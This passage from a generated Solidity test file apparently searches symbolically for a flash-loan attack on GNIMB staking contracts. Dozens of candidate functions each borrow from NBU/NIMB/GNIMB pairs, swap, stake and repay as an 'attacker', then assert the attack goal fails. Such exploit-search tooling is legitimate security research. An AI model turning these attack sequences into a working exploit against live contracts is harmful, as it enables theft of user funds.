        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4475(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4476(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4477(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4478(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4479(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4480(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4481(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4482(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4483(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4484(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4485(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4486(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4487(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4488(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4489(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4490(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4491(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4492(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4493(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4494(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4495(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4496(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4497(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4498(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4499(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4500(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4501(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4502(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4503(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4504(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4505(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4506(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4507(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4508(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4509(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4510(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4511(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4512(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4513(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4514(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4515(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4516(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4517(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4518(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
